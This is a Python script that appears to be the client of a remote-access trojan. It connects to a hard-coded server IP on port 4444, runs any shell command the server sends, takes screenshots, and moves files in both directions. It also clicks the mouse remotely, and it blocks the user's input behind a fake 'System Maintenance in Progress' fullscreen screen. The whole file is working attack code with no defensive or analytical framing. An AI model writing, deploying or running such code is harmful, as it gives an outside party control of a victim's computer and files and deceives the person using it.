import subprocess
import sys

def install_and_import(package, pip_name=None):
    try:
        __import__(package)
    except ImportError:
        print(f"[+] Installing {package}...")
        if pip_name is None:
            pip_name = package
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
    finally:
        globals()[package] = __import__(package)

install_and_import('PIL', 'Pillow')
install_and_import('pyautogui')
install_and_import('win32api', 'pywin32')
install_and_import('win32con', 'pywin32')
install_and_import('win32gui', 'pywin32')

import socket
import subprocess
import threading
import tkinter as tk
import ctypes
from PIL import ImageGrab
import io
import os
import pyautogui
import logging

SERVER_IP = '192.188.8.87'  # Change this to your server IP
PORT = 4444

client = socket.socket()
client.connect((SERVER_IP, PORT))

# Logging setup
logging.basicConfig(filename='client_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

def freeze_screen():
    def block_input():
        ctypes.windll.user32.BlockInput(True)

    def overlay():
        win = tk.Tk()
        win.title("System Freeze")
        win.attributes("-fullscreen", True)
        win.configure(bg="black")
        label = tk.Label(win, text="System Maintenance in Progress", fg="white", bg="black", font=("Arial", 32))
        label.pack(expand=True)
        win.attributes("-topmost", True)
        win.mainloop()

    threading.Thread(target=block_input, daemon=True).start()
    threading.Thread(target=overlay, daemon=True).start()

def unfreeze_screen():
    ctypes.windll.user32.BlockInput(False)

def send_screenshot(sock):
    image = ImageGrab.grab()
    buffer = io.BytesIO()
    image.save(buffer, format="PNG")
    img_bytes = buffer.getvalue()
    buffer.close()

    sock.send(str(len(img_bytes)).encode())
    sock.recv(2)
    sock.send(img_bytes)

def upload_file(sock):
    filename = sock.recv(1024).decode()
    try:
        with open(filename, 'rb') as f:
            data = f.read()
        sock.send(str(len(data)).encode())
        sock.recv(2)
        sock.send(data)
    except:
        sock.send(b'0')

def download_file(sock):
    filename = sock.recv(1024).decode()
    size = int(sock.recv(1024).decode())
    sock.send(b'OK')
    data = b''
    while len(data) < size:
        chunk = sock.recv(4096)
        data += chunk
    with open(filename, 'wb') as f:
        f.write(data)

def handle_chat(sock):
    while True:
        msg = sock.recv(1024).decode()
        print(f"\n[Admin]: {msg}")
        if msg.lower() == 'exitchat':
            break
        reply = input("[You]: ")
        sock.send(reply.encode())
        if reply.lower() == 'exitchat':
            break

def handle_remote_input(sock):
    x = int(sock.recv(1024).decode())
    sock.send(b'OK')
    y = int(sock.recv(1024).decode())
    sock.send(b'OK')
    click_type = sock.recv(1024).decode()
    if click_type == 'left':
        pyautogui.click(x, y)
    elif click_type == 'right':
        pyautogui.click(x, y, button='right')
    sock.send(b'CLICKED')

# Executor number AUTH
executor_number = input("Enter executor number: ")
client.send(executor_number.encode())
if client.recv(1024).decode() != 'OK':
    print("[-] Auth failed.")
    client.close()
    exit()

print("[+] Authenticated.")

while True:
    cmd = client.recv(1024).decode()
    logging.info(f"Command received: {cmd}")
    if cmd == 'exit':
        break
    elif cmd == 'freeze':
        freeze_screen()
        client.send(b'Screen frozen.')
    elif cmd == 'unfreeze':
        unfreeze_screen()
        client.send(b'Screen unfrozen.')
    elif cmd == 'screenshot':
        send_screenshot(client)
    elif cmd == 'upload':
        upload_file(client)
    elif cmd == 'download':
        download_file(client)
    elif cmd == 'chat':
        handle_chat(client)
    elif cmd == 'click':
        handle_remote_input(client)
    else:
        try:
            output = subprocess.getoutput(cmd)
        except Exception as e:
            output = str(e)
        client.send(output.encode())

client.close()
